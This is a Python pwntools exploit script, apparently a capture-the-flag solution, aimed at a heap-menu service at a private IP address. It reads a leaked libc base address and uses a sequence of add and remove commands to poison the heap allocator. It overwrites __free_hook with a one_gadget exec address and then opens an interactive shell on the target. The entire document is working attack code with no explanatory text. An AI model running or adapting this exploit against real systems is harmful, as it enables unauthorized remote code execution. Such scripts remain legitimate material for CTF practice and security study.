from pwn import *

exec_offset = int('0x4f302'.replace('0x',''),16)
free_hook_offset = int('0x3ed8e8'.replace('0x',''),16)

conn = remote('10.21.232.108',5555)
first_line = conn.recvline()
print(first_line)
first_line = first_line.split()
libc_base_address = int(first_line[len(first_line) - 1].decode('utf-8').replace('0x', ''),16)
print(hex(libc_base_address+exec_offset))

add_users = 'a\na\n1\n'*3
remove_users = 'r\n3\n'+'r\n2\n'+'r\n1'
free_hook_adress = libc_base_address+free_hook_offset
exec_address = libc_base_address + exec_offset
conn.sendline(bytes(add_users+remove_users,'utf-8'))
conn.sendline(b'a')
conn.sendline(p64(free_hook_adress)*5)
conn.sendline(b'1')
conn.sendline(b'a\na\n1\na')
conn.sendline(p64(exec_address))
conn.sendline(b'1')
conn.sendline(b'r')
conn.interactive()
conn.close()